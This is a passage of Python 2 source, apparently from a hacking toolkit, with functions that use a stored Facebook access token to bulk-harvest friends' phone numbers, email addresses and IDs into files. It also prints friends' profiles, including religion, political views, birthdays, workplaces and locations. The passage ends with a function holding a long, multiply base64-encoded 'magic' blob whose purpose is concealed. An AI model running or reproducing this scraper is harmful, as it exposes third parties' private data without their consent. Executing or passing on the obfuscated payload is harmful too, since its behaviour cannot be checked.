		main()
	except KeyError:
		print '[!] failed to fetch friend id'
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error                 '
		print '[!] Stopped'
		main()

 def dump_phone():
	print '[*] load access token'

	try:
		token = open('cookie/token.log','r').read()
		print '[*] Success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print "[*] fetching all phone numbers"
	print '[*] start'

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_phone.txt','w')

		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
			z = json.loads(x.text)

			try:
				out.write(z['mobile_phone'] + '\n')
				print W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['mobile_phone']
			except KeyError:
				pass
		out.close()
		print '[*] done'
		print "[*] all phone numbers successfuly retrieved"
		print '[*] file saved : output/'+n[0].split(' ')[0] + '_phone.txt'
		main()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print "[!] failed to fetch all phone numbers"
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error'
		print '[!] Stopped'
		main()

 def dump_mail():
	print '[*] load access token'

	try:
		token = open('cookie/token.log','r').read()
                print '[*] Success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print '[*] fetching all emails'
	print '[*] start'

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
                a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_mails.txt','w')

		for i in a['data']:
			x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
                        z = json.loads(x.text)

			try:
                                out.write(z['email'] + '\n')
			        print W + '[' + G + z['name'] + W + ']' + R + ' >> ' + W + z['email']
			except KeyError:
				pass
		out.close()

                print '[*] done'
                print "[*] all emails successfuly retrieved"
		print '[*] file saved : output/' + n[0].split(' ')[0] + '_mails.txt'
		main()

	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print "[!] failed to fetch all emails"
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error'
		print '[!] Stopped'
		main()

 def dump_id_id():
	global target_id

	print '[*] load access token'

	try:
		token = open('cookie/token.log','r').read()
		print '[*] Success load access token'
	except IOError:
		print '[!] failed load access token'
		print "[*] type 'token' to generate access token"
		main()

	try:
		os.mkdir('output')
	except OSError:
		pass

	print '[*] fetching all id from your friend'

	try:
		r = requests.get('https://graph.facebook.com/{id}?fields=friends.limit(5000)&access_token={token}'.format(id=target_id,token=token))
		a = json.loads(r.text)

		out = open('output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt','w')

		for i in a['friends']['data']:
			out.write(i['id'] + '\n')
			print '\r[*] %s retrieved'%(i['id']),;sys.stdout.flush();time.sleep(0.0001)
		out.close()

		print '\r[*] all friends id successfuly retreived'
		print '[*] file saved : output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt'
		main()
	except KeyboardInterrupt:
		print '\r[!] Stopped'
		main()
	except KeyError:
		print '[!] failed to fetch friend id'
		try:
			os.remove('output/' + n[0].split(' ')[0] + '_' + target_id + '_id.txt')
		except OSError:
			pass
		main()
	except (requests.exceptions.ConnectionError , requests.exceptions.ChunkedEncodingError):
		print '[!] Connection Error                      '
		print '[!] Stopped'
 #
 ###############################################################################

 ###############################################################################
 #                         Main

 def main():
  global target_id

  try:
	cek = raw_input(R + 'D3b2y' + W +' >> ')

	if cek.lower() == 'get_data':
		if len(jml) == 0:
			getdata()
		else:
			print '[*] You have retrieved %s friends data'%(len(jml))
			main()
	elif cek.lower() == 'get_info':
		print '\n'+'[*] Information Gathering [*]'.center(44) + '\n'
		search()
	elif cek.lower() == 'bot':
		menu_bot()
		bot()
	elif cek.lower() == "cat_token":
		try:
			o = open('cookie/token.log','r').read()
			print '[*] Your access token !!\n\n' + o + '\n'
			main()
		except IOError:
			print '[!] failed to open cookie/token.log'
			print "[!] type 'token' to generate access token"
			main()

	elif cek.lower() == 'clear':
		if sys.platform == 'win32':
			os.system('cls')
			baliho()
			main()
		else:
			os.system('clear')
			baliho()
			main()

	elif cek.lower() == 'token':
		try:
			open('cookie/token.log')
			print '[!] an access token already exists'
			cek = raw_input('[?] Are you sure you want to continue [Y/N] ')
			if cek.lower() != 'y':
				print '[*] Canceling '
				bot()
		except IOError:
			pass

		print '\n' + '[*] Generate Access token facebook [*]'.center(44) + '\n'
		print '[Warn] please turn off your VPN before using this feature !!!'
		id()
	elif cek.lower() == 'rm_token':
		print '''
 [Warn] you must create access token again if 
       your access token is deleted
 '''
		a = raw_input("[!] type 'delete' to continue : ")
		if a.lower() == 'delete':
			try:
				os.system('rm -rf cookie/token.log')
				print '[*] Success delete cookie/token.log'
				main()
			except OSError:
				print '[*] failed to delete cookie/token.log'
				main()
		else:
			print '[*] failed to delete cookie/token.log'
			main()
	elif cek.lower() == 'about':
		show_program()
		main()
	elif cek.lower() == 'exit':
		print "[!] Exiting Program"
		sys.exit()
	elif cek.lower() == 'help':
		info_ga()
		main()
	elif cek.lower() == 'dump_id':
		dump_id()
	elif cek.lower() == 'dump_phone':
		dump_phone()
	elif cek.lower() == 'dump_mail':
		dump_mail()

	if 'dump_' in cek.lower() and cek.lower().split('_')[2] == 'id':
		target_id = cek.lower().split('_')[1]
		dump_id_id()
	else:
		if cek == '':
			main()
		else:
			print "[!] command '"+cek+"' not found"
			print '[!] type "help" to show command'
			main()
  except KeyboardInterrupt:
	main()
  except IndexError:
	print '[!] invalid parameter on command : ' + cek
	main()
 #
 ######################################################################################################################

 ################################################################################
 #                          Get Data

 def getdata():
	global a , token

	print '[*] Load Access Token'

	try:
		token = open("cookie/token.log","r").read()
		print '[*] Success load access token '
	except IOError:
		print '[!] failed to open cookie/token.log'
		print "[!] type 'token' to generate access token"
		main()

	print '[*] fetching all friends data'

	try:
		r = requests.get('https://graph.facebook.com/me/friends?access_token='+token)
		a = json.loads(r.text)

	except KeyError:
		print '[!] Your access token is expired'
		print "[!] type 'token' to generate access token"
		main()

	except requests.exceptions.ConnectionError:
		print '[!] Connection Error'
		print '[!] Stopped'
		main()

	for i in a['data']:
		jml.append(i['id'])
		print '\r[*] fetching %s data from friends'%(len(jml)),;sys.stdout.flush();time.sleep(0.0001)

	print '\r[*] '+str(len(jml))+' data of friends successfully retrieved'
	main()

 def search():

	if len(jml) == 0:
                print "[!] no friend data in the database"
                print '[!] type "get_data" to collect friends data'
                main()
        else:
                pass

	target = raw_input("[!] Search Name or Id : ")

	if target == '':
		print "[!] name or id can't be empty !!"
		search()
	else:
		info(target)

 def info(target):
        global a , token

        print '[*] Searching'
	for i in a['data']:

	  if target in  i['name'] or target in i['id']:

		x = requests.get("https://graph.facebook.com/"+i['id']+"?access_token="+token)
		y = json.loads(x.text)

		print ' '
		print G + '[-------- INFORMATION --------]'.center(44)
		print W

		try:
			print '\n[*] Id : '+i['id']
		except KeyError:
			pass
		try:
			print '[*] Username : '+y['username']
		except KeyError:
			pass
		try:
			print '[*] Email : '+y['email']
		except KeyError:
			pass
		try:
			print '[*] Mobile Phone : '+y['mobile_phone']
		except KeyError:
			pass
		try:
			print '[*] Name : '+y['name']
		except KeyError:
			pass
		try:
			print '[*] First name : '+y['first_name']
		except KeyError:
			pass
		try:
			print '[*] Midle name : '+y['middle_name']
		except KeyError:
			pass
		try:
			print '[*] Last name : '+y['last_name']
		except KeyError:
			pass
		try:
			print '[*] Locale : '+y['locale'].split('_')[0]
		except KeyError:
			pass
		try:
			print '[*] location : '+y['location']['name']
		except KeyError:
			pass
		try:
			print '[*] hometown : '+y['hometown']['name']
		except KeyError:
			pass
		try:
			print '[*] gender : '+y['gender']
		except KeyError:
			pass
		try:
			print '[*] religion : '+y['religion']
		except KeyError:
			pass
		try:
			print '[*] relationship status : '+y['relationship_status']
		except KeyError:
			pass
		try:
			print '[*] political : '+y['political']
		except KeyError:
			pass
		try:
			print '[*] Work :'

			for i in y['work']:
				try:
					print '   [-] position : '+i['position']['name']
				except KeyError:
					pass
				try:
					print '   [-] employer : '+i['employer']['name']
				except KeyError:
					pass
				try:
					if i['start_date'] == "0000-00":
						print '   [-] start date : ---'
					else:
						print '   [-] start date : '+i['start_date']
				except KeyError:
					pass
				try:
					if i['end_date'] == "0000-00":
						print '   [-] end date : ---'
					else:
						print '   [-] end date : '+i['end_date']
				except KeyError:
					pass
				try:
					print '   [-] location : '+i['location']['name']
				except KeyError:
					pass
				print ' '
		except KeyError:
			pass
		try:
			print '[*] Updated time : '+y['updated_time'][:10]+' '+y['updated_time'][11:19]
		except KeyError:
			pass
		try:
			print '[*] Languages : '
			for i in y['languages']:
				try:
					print ' ~  '+i['name']
				except KeyError:
					pass
		except KeyError:
			pass
		try:
			print '[*] Bio : '+y['bio']
		except KeyError:
			pass
		try:
			print '[*] quotes : '+y['quotes']
		except KeyError:
			pass
		try:
			print '[*] birthday : '+y['birthday'].replace('/','-')
		except KeyError:
			pass
		try:
			print '[*] link : '+y['link']
		except KeyError:
			pass
		try:
			print '[*] Favourite teams : '
			for i in y['favorite_teams']:
				try:
					print ' ~  '+i['name']
				except KeyError:
					pass
		except KeyError:
			pass
		try:
			print '[*] School : '
			for i in y['education']:
				try:
					print ' ~  '+i['school']['name']
				except KeyError:
					pass
		except KeyError:
			pass
	  else:
		pass

        else:
		print W + ' '
		print '[*] Done '
		main()

 #
 ##########################################################################

 ##########################################################################
 #

 if __name__ == '__main__':

	baliho()
	main()

 #
 ##########################################################################

 	
 backtomenu_account()
def facebook_guardn():
 import base64, codecs

 magic = 'aW1wb3J0IGJhc2U2NCwgY29kZWNzCQkKbWFnaWMgPSAnYVcxd2IzSjBJR0poYzJVMk5Dd2dZMjlrWldOekNRa0tiV0ZuYVdNZ1BTQW5ZVmN4ZDJJelNqQkpSMHBvWXpKVk1rNURkMmRaTWpscldsZE9la05SYTB0aVYwWnVZVmROWjFCVFFXNVpWbU40WkRKSmVsTnFRa3BTTUhCdldYcEtWazFyTlVSa01tUmFUV3BzY2xkc1pFOWxhMDVTWVRCMGFWWXdXblZaVm1ST1dqRkNWRkZYTlZwV2JVNDBXa1JLU21Wc1RuRlJhM0JUVFVoQ2RsZFljRXRXYXpGeVRsVlNhMDF0VW1GVVYzQnpZMnhrYzFwRk9XeGhNRFZUV1ZSQ01HRldXWGRYYmxaYVZtMVNUMWRxUmtOV1JrWllUbFp3VjJKVk5EQlhhMUpMVTIxV2MxUnVSbEpoTTBKVVZGVm9RMlJzWkZsalJYUlhZWHBHZVZSc1ZsTmhNREYwVlcxR1ZWWXpRbnBaTW5ocll6RndSazlYZUdoTlJGWlVWMVpTUTAxSFJsZFhXR1JZWW14YVlWWnRNVk5VTVdSeFVtdE9WMUpyV2xsVWJGcDNWakpLVms1RVFsaGhNVXBNVlRJeFYyTXhVblZTYkVwb1RUQktWVlpHVm05Uk1sSnpXa1pzYWxKWVVsaFpXSEJIWlZaU2MxWnNUbWhOUkVZd1ZsY3hSMVpXV1hwUmJuQmFUVzVvY2xsNlJuZFNhemxZWlVkb1RsSkdXbFZXTVZwVFVUQXhTRkpzWkZoWFIxSlpXVzE0WVZsV1duUk5WazVWVFZkU2VGVnRkRTlXTVVweVYyeHNWV0pHY0ROV2FrcExWbXMxUlZGc2FHaE5WWEJOVmxSSmVGWXlUWGhWYmxaVFlrVndiMVJVUWt0V1ZscEhWbTA1VWsxc1NucFhhMXB6WVd4S1dWVnNhRnBYU0VKSVdsWmFVMk14V25OVWJXaE9Va1ZaZDFac1kzaFNNVnBYVjFod1VtSnVRbUZVVnpWdlkyeHNObEp1WkZOaGVteFpXbFZrYjFSc1NrZFhiRlpYVFZad1ZGVlVRWGhUUmtweldrWm9XRkl4U2xwWFZ6RTBXVlpzVjFkdVVrNVdhelZXVkZaa1UyVkdWblJrUlRsWFRWVndlVll5ZUhOV1YwcEhZMFJPVjJGcmNFeFdiWE14VWxaR2MyRkhhRTVXV0VKT1ZteFNTbVZHV1hsVVdHaFdZbXhhVkZsclZuZGlNVkpWVVd0MFYxWnNjRWhXYlRBMVZXc3hjMU51Y0ZoaE1YQjZXVmQ0UzFkV1ZuTmhSbkJZVTBWS1NWZHNXbUZWTWsxNFYyNU9WV0pYYUU5VmExWmFaREZhYzFremFGTk5WbkJZVmpGb2QxVnRTblZSYlVaVlZucFdkbGt5ZUhOT2JFcDFXa1pPYUdWdGVGcFhiRlpyWWpGU2MxTnJaRmhpUmxwWVZGWmFkMVpHVmxWUldHaFVVbXR3ZWxkcldtOVhSa2w0VTJ4d1dGWjZSVEJYVmxwelZqRmtkVlZyTlZkaGVsWlhWa1phYTFVeVZrZFdibEpyVWxSc1dGUldWbmRsVmxsNVpVaE9WMVl3Y0VoWk1GSlBWakpHY21ORmVGZGlXRTE0Vld4YVIyTXlSa2hoUlRWWFYwVktUMVp0ZUZOVGJWWkhWMWhzVlZkSGFGZFpiWGhoVmtac2NsWnVaR2xOVmtwV1ZWZDBNRll4V25OalJXaFhZbFJCTVZaWGMzaGpNVTUxWTBab2FFMVlRalpYVm1RMFV6RmtWMVp1VG1oU2JrSlpWVEJXUzFOV1pITlhiVVpXVFdzeE5GWXlOVTlXVjBwWVlVVTVWbUV4V21GYVJFWmhZekZyZW1GR1RrNVdia0paVm1wR2IyUXhWblJUYmxaU1lsVmFWbFp1Y0Zka2JHdDVaVWhPVDJKRmNERlhhMXBQWVVkV2RHVkdjRmhpUmxweVdXcEdVMk14VG5KYVJtaHBVbXh3V1ZaR1dtRmtNVnBIVm14V1VsZEhhRlZWYlhSM1pXeGtjbGR0T1ZoU2EydzBWVEo0ZDFkR1dqWlNWRUpZVm14d2VsWnFSbXRrVmxaeVRsWmthR1ZzV2xoV2ExcGhZVEZWZVZaclpGZGliRXB5Vld4U2MxZEdVbGRXYm1Sc1ZteHNOVnBWYUU5V01WbDNZMFZvV2sxR1NsQldha3BIWTIxT1JtVkdaR2xYUlRFMFZsZDRZVkl5VFhsU2EyaG9VbFJXV0ZZd1ZrdFVNVnAwWlVaT1ZHSldXa2hXTVdoelZsWmtTR0ZHWkZwaVdHaG9WbXRhYzJOc1duVmFSMnhPVm10d1YxWldaREJOUmxsNFYyNU9hbEpYYUZoWmJGSkNUVlphV0dNemFHcE5WVFV4V1RCYWIyRkZNVmxSYWxwWVZtMVJNRlY2Um10V01WcDFWRzFvVTJKclNscFdWRUpYVXpGT1YxcElUbGhpVlZwWFZGZHplRTVHV1hsT1ZUbFhWakJ3V1ZsVlZUVldiVVY0VjIxR1lWSkZXbWhaZWtaeVpXMUdSMVJyTlZkaWEwcGFWbTF3UjJJeVVYaFdibEpVWW14YVUxbHNWbUZXYkZwMVkwWmthMkpIZERWYVZXaFBWREpLUm1ORVJsaGhNWEJRV1ZWa1YyUkhWa2RqUm1ocFVteHdlVmRYY0VkVk1rMTRWRzVLWVZKdGFIQlZiWGgzVjFaYVIxZHRSbXROVm5CSVZtMTRWMVZzWkVoaFJsWldZbGhTTTFwWGVHdGpiR1IwVDFab1UyRXlkekJXVkVvMFpERmtSMWRxV2xOV1JVcFpWbTE0ZDJWc1duRlNiWFJyVm14YWVWUnNXbXRoUjFaelYyeG9WMkV4Y0doWlZFWldaVlphY2xwR1pHbGlSWEI1VmxkNFUyTXhaRWRWYkdSWFltMVNjMVp0ZUhOT1ZuQldZVVU1VjAxV2JETlpNRlp2VjJzeFIxTnNRbGRoYTNCSVdUSXhUMUp0VmtkYVIyeFlVbFJGTUZac1pEUlpWa2w1VkZoc1UyRXlhRzlWYkZKWFYwWlpkMVpyZEZWTlZuQXdXbFZhVDFaSFNsZFhhMmhYVFZkb2VsWnNXbXRUUjBaSFdrWndhVmRIYUc5V2JYUmhZekpPYzFkdVZtRlNNbmhQVm0xMGQxWXhXbGRhUkVKT1VteHNORll5TlU5aGJFcFlZVVpvV21KR1NrTlVWbHBoVjBkTmVtRkhjRTVXVkZWNFYxUkNZV0l5UmtaTlZteFNZV3h3V1ZadE1WSk5SbFkyVW0xMFYwMVdjREZXUnpGdlZUSktjbE5zY0ZkV1JVcFlWWHBHVDFZeGNFbFViR2hwVmxad1dGWkdaSHBsUlRWSFYxaHNUMVpVYkZoV2FrSjNWMVpzVmxaVVZsZGlWVlkwVmpJeFIxbFdTa1pYYldoYVpXdGFlVnBYTVVkU01WSnlUbFprYVdFd2NHRldiVEYzVWpKSmVWVllhRmRpYkVwVldXMTRZVlV4YkhOV2JVWlhZa1p3TVZrd1dtdGhNa3BJWkVSV1lWWlhhRkJXUkVwTFVtMU9SVkpzYUdoTldFSlJWMVpXYTFZeVVraFdhMlJxVW0xb2NGVnRlSGRsVm1SWVkwVmtWazFyTVRSV1J6VkxXVlpLZEdGSVFsWmlXR2d6VmpGYVlWSXhaSFJTYlhST1ZtNUNTVlp0TVRSV01WWnpXa1ZvYUZKc1dsZFpiR2hUVFRGd1dHVkhkR3BpUjFJd1ZERmFiMVV5Ulhsa2VrSlhWa1Z2TUZwRVJtdFNNV1J4VjJ4T1YxSlZjRnBXYlRFMFpESldjMWR1UmxOaVdGSnlWbTE0WVdWV1VuTlhiWFJvVWpGYWVsWXllRzlXTWtWNFkwZG9XbFpGV2xkYVZscGhZMnh3UjFwSGJHbFNXRUkxVm14a05GVXlUWGhhUldSV1lrZFNXRmx0TVZOak1WcDBaVWhPVDFadVFsZFpWVlUxVmpBeFYySkVUbHBOUmxwMlZqSnplRkl4VG5OUmJHUm9ZVE5DU1ZkVVNYaFVNVXAwVm10a1lWSXllRmxWYkZKR1RVWmFjMXBFVWxwV2EydzFWa1pvYzFVeVJYbGhSemxXWWtaS1dGWXdXbHBrTVZweVpFWldUbFp1UVhkWGJGWmhWREZhU0ZOc1pGaGhNbWhZVkZaa2IyVnNXbk5YYlhSVVVqQmFTRmRyV25kaFZtUklZVWM1VjJKWVVtaFpla3BQWXpGa2RWWnRSbE5OYm1oUVZtMHhNR1F4V1hoWGJHUmhVa1ZLVDFWdGVITk9SbGw1VGxVNWFHSkZjRmxaVlZwdlYyMUtSMU5yVGxWV2JIQm9WakJrVG1WdFJraGpSVFZYVmtaV05GWXhVa05aVjBsNVVtdGFUbFp0ZUZOWlYzaDNWMVphZEUxV1NrNVNiRmt5VlcweE1GWXdNVmRqUkVaWFVucEdkbFpVU2t0amJFNXpZMFprVjFKVmNGbFdXSEJIVkRGWmVHTkZiRlZpUjJod1ZteGFkMWRHV2tkYVNIQnNVbFJXU0ZZeGFITlVNVnBWWWtab1YyRnJTak5XTVZwelZteGFWVlpzWkdsV1Zsa3dWbXBKZUZJeGJGZFRhMXBZWWxkb1lWcFhkR0ZsVm5CWVRWVmtVMDFXU25sVWJGcHJZVmRGZDJOSFJsZGlWRVl6VldwS1NtVldWbGxoUm1ScFlrVndWbGRYTVRSWlZsVjRZa2hPVjJKVldsaFphMXAzVFZacmQxZHRkR2hOYTNCSldrVlNWMWxXV2xoaFJrSlhVa1Z3VEZWdE1VOVNWa3B6WVVkb1RsZEZTbEpXTVZwWFlURlplVlZyYUZkaE1sSnhWVzB4YjJOR1ZuUmxTR1JzVm0xU1dWa3dWbXRXYXpGeVRWUlNWMUo2Vmt4WFZscExaRWRHU1ZGc1dtbFhSMmQ2Vm1wR1lWbFdTWGhhU0ZKVFlsaFNUMVp0TlVOVFZscDBUVlJTVjAxV1ducFhhMVp2WVVaS2MxZHNaRnBpUjJoVVZGUkdkMWRIVmtoa1IzQnBVakZKZDFaRVJtRmlNVlY1VWxoc2EyVnJTbGhXYTFaMlRVWndSVkp0ZEZOTlYxSjRWako0VDFZeFNsWmpSbkJYWWxSRk1GcEVTbGRqTVdSMVVteE9hVmRHU25sV2JURTBXVmRXVjFWdVRsaGlXRkp2VldwR1lXVnNXWGxsUnpsWFRXdFdORmt3Wkc5WGJGcEdWMnhrWVZac2NHaFpNbmgzVWpGd1NHSkhiRk5YUlVreFZtMTRhMDVHVlhsVVdHaGhVbGRTVjFsclpGTlhSbXgwVFZaT2FrMVdjREJhVldoUFZERmFkVkZzWkZwV1ZsVXhWbXBCZUZZeVNrVlViSEJPVW14d01sWnFTbnBsUmtsNFZHNU9VbUpIVW05WlZFNURVMVprVlZOWWFGVk5WWEF3Vm0xMGExbFdTWGxsUm14V1lrWktSMVJWV21Gak1YQkZWV3h3VjJFeWR6RldhMXB2WXpGVmVWSlliR2hTZW14WFdXdGFTMWRHV1hkWGJIQnJUVlp3ZVZwRldsZFViRnAxVVZoa1dHSkdXbWhXUkVaaFUwWk9jMXBHYUdoTmJXaFpWa1phYTJJeVZuTlhiazVZWWxoU1ZWVnFRbUZUUm1SeVYyNWthRlp0VWtsWlZXTTFWakpLV1ZWdGFGcGxhM0JRV1hwR2EyUldXblJTYkU1T1ltMW9VVlp0TUhoTlIxRjRWMWhvV0dKSFVtaFZhMVpMVkRGV2RHVklUazlTYkd3MVZHeFZOV0ZIU2taalJteGFWbFp3ZGxZeU1VdFNNVTV5Vkd4V1YySklRbTlXYWtKclZHMVdkRkpyYUdwU1ZGWllWbXRhVjA1R1dYaFZhMDVhVmpCc05WVnRkR0ZVYkZwMFpVWk9XbFl6YUROV01WcGhaRVV4VjFOck5WTmlSbXQ1Vmxjd2VFMUdXWGROVm1ScVVrVmFXRlZ1Y0Vka2JGcFZVMnQwYW1KRk5YcFpNRnByVmpGS1ZtTkdiRmRYU0VKSVZrUkdXbVZIVGtaaVJsWnBVakpvZDFadGVHRmtNV1JIVjJ0a1lWTklRbk5WYkZKWFUwWlplR0ZJVGxWTlZuQldXV3RhYjFZeVJuSlRhazVYVFZad2VsWnRlR0ZXVmxweldrZHNWMVpzYTNkV2JYQktaVVpKZUdKR1pGUmhNWEJaV1d4a2IxbFdjRmhrUjBac1ZtNUNXVlJXVm10Vk1ERlhVMjVzVldKR2NISlpWbVJHWkRKT1NGSnNaR2xXUlZsNlZsZHdTMU50VmxkV2JHeG9VbTFTY0ZsclZuZFdiR1JZVFZSU1dsWnNWalJaYTJoUFZqSktWbGRzYUZwaE1YQXpWRlphY21ReFpIUmtSMmhPWVROQ1NsZHJWbE5XTVd4WFYyeG9hRkpyU2xoVmExWjNWRVpXZEUxVk9WTldhM0I2V1ZWa2IxUnNaRVpUYkVwWFRWWndXRmxVUmxwbFZsWnlZVVprYUUxc1NuaFdWekI0WWpKT1IxWnVVbXhUUjFKelZtMHhVMWRXYTNkV2JYUlhZWHBHZVZSV1VsTldNVW8yVm10NFdGWnNjRXhhUldSSFUxWkdjMWR0YkZoU01tUTJWbTF3UjFsV2JGZFRXR2hoVTBaS1ZGbHNhRk5VTVZwMFRsVk9WRlpzY0RCVVZsSlRWakF4VjFkdWNGaGhNVnAyV1ZWYVMyTXhaSE5hUm5CcFVqSm9WVlpHVWtka01XUklWbXRvYTFJelFuQlZha1pLWkRGYVJWSnRSbWxOVmxZMVZXeG9jMkV5Vm5KVGJHaFhZVEZhTWxSVlduZFNWa3AwWkVaT1RsWXhTalJXYWtvMFZERlplRk5zV21wU2JrSllXV3hTUmsxR2NFVlRiR1JxVFZkU01WVnRlRTloVm1SSFUyNXNWMkpVUlRCWFZtUlhWakZXZFZSc2FHbFhSa3AyVmxkd1IxbFhWbk5YV0d4c1VucHNXRlJYZEZkT1JtdDNXa2M1V0dKR2NFZFdNbmhyV1ZaYWMyTkhhRnBOYm1nelZXcEdkMU5IU2toaVJrNVlVbFZyZUZadE1UUmhNRFZIVmxoc1ZWZEhhR2hWYkdSVFZqRnNjbHBHVGxoU2JYZ3dWRlphVDJGck1WZGpSRUpoVmxkb1VGWkVSbUZrVmtaeldrWndWMVpzVlhoV2JYQkNaVVpaZVZOclZsVmlTRUpQVlcxNGQwMXNXbkZUYm5Cc1VtdHNORlpITlU5VmJVcElWVzA1V2xaRk5VUlZNVnByVmxaT1dXRkdWazVXV0VGM1ZtMHhNR0V4YkZkVFdHeHNVbTE0VjFscldrdFNNVkpXVjIxR2FrMVlRa1pXVjNoM1ZqSkZlV1I2UmxkaE1YQjJXWHBHVm1WV1NsbGlSMmhUWlcxNFdGZFhkR0ZUTVdSSFYxaGtXR0pJUW5KVVZscDNaVlp3Umxkc1pGVmlSbkF4VlZab2ExZEhTa2RYYldoWFVrVmFhRlV3V2s5ak1YQkhZVWRvVG1KWGFGcFdhMXBoWVRKSmVWWnVUbGhpYXpWWldXeG9VMVpXVm5GUmJVWlVVbTFTZVZZeU5XdGhSbHAwVld0c1dsWlhUVEZXYWtwTFYxWldkR0ZHY0d4aE0wSlJWMWh3UjJFeVVsZFhibEpUWWtVMVQxbHRNVzlWVmxwMFRVaG9UbEl4UmpSV01XaHZWMGRLU0ZWdGFGWmhNVnBNVmtSR1YyUkhWa2xVYXpsVFlrZDNNVlpIZUZaT1YwWklVMnRhYWxKdGVHRldiRnAzWkd4WmVVMVZkRk5OVlRWNVZrZDRWMVl5U2tsUmJUbFhZV3RLY2xaSE1WZGtSa3B5WVVkd1UxWkdXbGxXYlhSaFZqQTFSMWRZYUZaaE1EVmhWbXBDYzA1V1ZuUmtSMFpWWWtad01GcFZXazlYYkZsNllVUk9WMDFXY0doYVJWVjRWakZPY2s1V1RtbFNiWFExVm14amQyVkZNVWRYV0dST1ZtMVNjVlZyVm1GWFJsWjFZMFZrYTJKR2NGWlZNblF3WVcxS1JrNVljRnBOUm5CeVZtcEdTMVp0VGtkaVJtUllVMFZLU1ZaclVrZFhiVlpJVkd0YWFWSnNXbkJWYWtwdlpERmFkR1ZIUm10TlYxSklWakowYTFsV1RrbFJiazVXWWtaS1dGVXdXbHBsUjBaSlZHeFdUbFp1UWxkWFYzUmhZakZaZVZKdVNsUmhhelZZVkZaYWQyVnNXblJsUjBaWFZteHdlbGRyWkhOV01WcHpZVE5rVjJKWVFrdGFWVnBLWlVkS1IxcEdVbWhOV0VKYVYxZDRhMkl4YkZkalJtaHJVakJhYzFadE5VTlhWbEpYVm0xMFZrMUVSbGhWTWpWelZsZEtSMk5JU2xwV2JWSkhXa1JLVDFOR1NuTmFSMnhYVWxac05sWnNaSGRUTVU1MFZteGtWMkpIZUc5VmJURlRZMFpzY2xadVpGZGlSMUpaVkZaU1UxZHNXbk5XYWxKYVlUSm9VRlpxU2t0V2JHUnpZVVp3YUUxWVFYcFdSbHBoWTIxUmVGcElVbXRTTW1oUFdWUk9RMU5zWkhKV2JFNVhUVmQ0V0ZZeWVHOWhSa3B5VTJ4b1ZtRXhXak5XUlZwWFpFVXhWazlXVGxkaE0wSTJWMVpXYTJJeFVuTmFSVnBVWWtWd1dGUldXbmRYUm14VlVteHdiRlpzV25sWlZWcHJZVVV4YzFOdWFGZFdla0kwV1dwS1QxSXhXblZWYlhoVVVqRktlbFp0TUhoVk1XUlhZVE5rVjJKWVVsaFpXSEJIWlZaU1YxVnNUbGROVlc4eVZtMTBORmRHV25OalJYaGhVbGRTU0ZVeFdrZGpNV1IwWWtab1UwMXRVVEpXYlRGM1VqRnNWMkpHWkZSWFIyaG9WVEJhUzFaR2JITmhSazVWVFZad01GUnNWazlXUmxwelkwUkNWVlpzU2xSV2FrRjRWakZrZFdOR2FHaE5WbkF5VjFaV1lWTXlUWGhhU0U1aFVtNUNjRlZxU205V1ZscEhWV3RrYTAxWFVrbFdiWFJ2WVRGSmVsRnVRbFpoYTFwTFdrUkdZVkpXU25SU2JXeE9WbXhaTVZaWGVHOWpNa1Y1Vm01S1ZHSkhhRmhaVkVaaFRXeFNWbGR1WkZOV2EzQXdXa1ZhVDFSc1dYaFRhbEpYWVd0dk1GWkVSbHBsUms1elYyMXdVMkpyU2xsWFYzaFRVbXN4UjJORlZsUmlSMUp4VkZaa1UwMVdWblJsUlRsb1ZtMVNTRlV5TlhOV01rcFZVbFJDV0ZadFVsaFdha1pYWkZaU2MyRkhiRmhTYTNBeVZteGtkMUl4YkZoV2JrNVlWMGQ0YzFWdWNITlhSbEpZWkVaa1QxSnRkRE5YYTJNMVYwZEtSMk5GWkZkTmJtaHlWMVphWVdNeVRraGhSbkJPWW0xbmVsWlhjRWRrTVU1SVUydG9hVkpyTlZsVmJGWnlaVVphZEUxVVVtaE5SRlpJVm14b2MxWldaRWhoUjJoV1lrZFNWRlpxUm5OamJIQkhWR3hvVTJKWVozZFdSbHBoVkRKR2NrMVdaR3BTUlVwb1ZteGtiMVZHV2tWU2JVWnJWbXRhZWxkclduZFdNVnB6Vmxob1YySllRa05hVlZwYVpWWk9jbFpzVm1sVFJVcFFWbGN4TkdRd01YTlhia1pVWW01Q2MxVnRkSE5PUmxwSVRsVTVWbUpWY0VsV1Z6QTFWMnhhUms1VlVsWk5WbkJ5Vm14YVQxZFhSa2RXYXpWWFYwVkdNMVp0TUhoTlIwVjRZa1prVkZkSGVITlZiVEUwVmpGc2NsZHJkRk5OVmtwWFZqSXhSMkZyTVZsUmExcFhWak5vTTFacVNrWmxWMUkyVW14a2FFMVlRakpYV0hCSFZtMVdWMU5zYkdsU01taFVXbGN4TkZkR1pGaGtSMFpVVFZkU1NGWXhhR3RYUjBwSlVXNUtWVlpzY0ROYVZscDNVbXhrYzFwR1ZtbFNia0Y0VmxaYWIyRXhaRWhUYTJSWVlsZG9XRlZyVm1GaFJsVjNWMnM1YWsxWVFraFpWV1J2VkcxS1dHRkdjRmRoTVhCb1dWUktTbVZXV25WVWJHaHBZWHBXV2xkWGVHOVZNVnBYVm01R1VtSlZXbFZWYlRGVFpWWlplVTVYZEdoU2JIQXdWbGQwYzFkc1dsaFVWRVpYWVd0d1RGWXhXbGRr